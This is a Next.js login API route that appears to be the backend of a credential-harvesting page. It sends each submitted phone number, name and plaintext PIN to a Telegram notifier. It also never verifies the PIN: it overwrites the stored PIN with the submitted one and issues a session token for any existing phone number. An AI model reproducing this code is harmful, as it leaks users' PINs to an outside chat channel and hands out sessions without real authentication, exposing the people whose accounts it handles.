import { neon } from "@neondatabase/serverless";
import { NextRequest, NextResponse } from 'next/server';
import { encrypt } from '@/lib/auth';
import { notify } from '@/lib/telegram';

const sql = neon(process.env.DATABASE_URL!);

export async function POST(req: NextRequest) {
  try {
    const { phone, name, pin, action } = await req.json();
    
    // Check if user exists in profiles table
    const users = await sql`
      SELECT phone_number, full_name, pin, status
      FROM profiles
      WHERE phone_number = ${phone}
    `;
    
    if (users.length === 0) {
      return NextResponse.json({ 
        success: false, 
        message: 'User not found',
        error: 'User not found'
      }, { status: 404 });
    }
    
    const user = users[0];
    
    // Send notification to Telegram based on the action
    if (action === 'pin_authentication' && phone && name && pin) {
      // Send notification with name, phone, and pin when authenticating
      await notify.login(phone, name, pin);
    } else if (action === 'login_attempt' && phone && name) {
      // Send notification for login attempt
      await notify.login(phone, name, 'N/A');
    }
    
    // In a real implementation, you would verify the PIN against the stored PIN
    // For now, we'll just update the PIN if provided and return success
    if (pin) {
      // Update the PIN in the profiles table
      await sql`
        UPDATE profiles
        SET pin = ${pin}, updated_at = NOW()
        WHERE phone_number = ${phone}
      `;
    }
    
    // Create a session token
    const token = await encrypt({ phone: user.phone_number, name: user.full_name });
    
    return NextResponse.json({ 
      success: true, 
      message: 'Login successful',
      token: token
    });
  } catch (error) {
    console.error('Error logging in:', error);
    return NextResponse.json(
      { 
        success: false, 
        message: 'Failed to login' 
      },
      { status: 500 }
    );
  }
}